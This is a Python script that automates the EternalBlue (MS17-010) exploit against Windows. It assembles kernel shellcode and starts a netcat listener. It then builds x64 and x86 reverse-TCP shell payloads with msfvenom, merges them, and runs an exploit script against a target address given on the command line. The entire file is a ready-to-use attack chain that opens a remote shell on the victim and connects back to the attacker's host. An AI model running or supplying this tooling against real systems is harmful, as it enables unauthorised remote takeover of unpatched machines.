#!/usr/bin/env python3

import os
import subprocess
import argparse

parser = argparse.ArgumentParser(description="#209")
parser.add_argument('-lh', dest='LHOST', help="LHOST bro")
parser.add_argument('-rh', dest='RHOST', help="RHOST bro")
parser.add_argument('-lp', dest='LPORT', help="LPORT bro")

args = parser.parse_args()
LHOST = args.LHOST
RHOST = args.RHOST
LPORT = args.LPORT

os.system("nasm -f bin /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x64_kernel.bin")

os.system("nasm -f bin /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x86_kernel.bin")

#LHOST = input("LHOST for reverse connection: ")
#RHOST = input("RHOST to sploit (should be host): ")

#ncListener = input("LPORT you want to listen on: ")
ncprocess = subprocess.Popen(
	"gnome-terminal -- nc -lvnp %s" % LPORT,
	stdout = subprocess.PIPE,
	stderr = None,
	shell = True
)

print("Generating x64 cmd shell")    
msfvx64string = "msfvenom -p windows/x64/shell_reverse_tcp -f raw -o /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x64_msf.bin EXITFUNC=thread LHOST=%s LPORT=%s" % (LHOST, LPORT)
print(msfvx64string)
os.system(msfvx64string)

print("Generating x86 cmd shell")
msfvx86string = "msfvenom -p windows/shell_reverse_tcp -f raw -o /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x86_msf.bin EXITFUNC=thread LHOST=%s LPORT=%s" % (LHOST, LPORT)
print(msfvx86string)
os.system(msfvx86string)

print("MERGING SHELLCODE WOOOO!!!")
os.system("cat /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x64_kernel.bin /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x64_msf.bin > /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x64.bin")

os.system("cat /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x86_kernel.bin /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x86_msf.bin > /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x86.bin")

os.system("python3 /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/eternalblue_sc_merge.py /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x86.bin /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_x64.bin /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_all.bin")

os.system("python3 /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/42031.py %s /root/Dropbox/PythonStuff/eternalblue/AutoBlue-MS17-010/shellcode/sc_all.bin" % RHOST)